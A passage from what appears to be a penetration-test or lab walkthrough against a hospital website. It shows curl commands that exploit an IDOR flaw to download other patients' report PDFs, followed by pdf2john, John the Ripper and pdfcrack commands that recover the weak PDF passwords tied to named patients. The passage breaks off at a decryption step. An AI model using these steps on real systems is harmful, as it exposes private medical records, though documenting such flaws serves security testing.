STEP 10: IDOR - Download PDFs
-----------------------------
Goal: Download patient reports without ownership validation.

Command:
curl -sk "https://medirozahospital.com/patient/download.php?id=1" \
     -H "Cookie: PHPSESSID=NEW_SESSION_ID" \
     -o patient_report_1.pdf

curl -sk "https://medirozahospital.com/patient/download.php?id=2" \
     -H "Cookie: PHPSESSID=NEW_SESSION_ID" \
     -o patient_report_2.pdf

curl -sk "https://medirozahospital.com/patient/download.php?id=3" \
     -H "Cookie: PHPSESSID=NEW_SESSION_ID" \
     -o patient_report_3.pdf

Tool Used: curl

Result:
All 3 PDFs downloaded successfully

Observation:
Any authenticated user can access any patient's report
No ownership validation between patient account and requested file


================================================================================
                    PHASE 5: PDF ENCRYPTION CRACKING
================================================================================

STEP 11: Extract PDF Hashes
---------------------------
Goal: Extract crackable hashes from encrypted PDFs.

Command:
pdf2john patient_report_1.pdf > patient1.hash
pdf2john patient_report_2.pdf > patient2.hash
pdf2john patient_report_3.pdf > patient3.hash

Tool Used: pdf2john

Result:
patient_report_1.pdf:$pdf$2*3*128*4294967292*1*32*...
patient_report_2.pdf:$pdf$2*3*128*4294967292*1*32*...
patient_report_3.pdf:$pdf$2*3*128*4294967292*1*32*...

Hash Format:
- Version: 2 (PDF 1.4-1.6)
- Revision: 3 (128-bit AES)
- Key Length: 128 bit


STEP 12: Crack PDF 1 - S. Dlamini
---------------------------------
Goal: Crack password for patient_report_1.pdf.

Command:
john --wordlist=/usr/share/wordlists/rockyou.txt patient1.hash

Tool Used: John the Ripper

Result:
Found password: 123456

Time to Crack: Instant


STEP 13: Crack PDF 2 - P. Reddy
-------------------------------
Goal: Crack password for patient_report_2.pdf.

Command:
john --wordlist=/usr/share/wordlists/rockyou.txt patient2.hash

Tool Used: John the Ripper

Result:
Found password: password

Time to Crack: Instant


STEP 14: Crack PDF 3 - E. Thompson
----------------------------------
Goal: Crack password for patient_report_3.pdf.

Command:
pdfcrack -f patient_report_3.pdf -w /usr/share/wordlists/rockyou.txt

Tool Used: pdfcrack

Result:
Found user-password: '!@#$%^&'

Time to Crack: Very Fast


STEP 15: Decrypt PDFs
---------------------
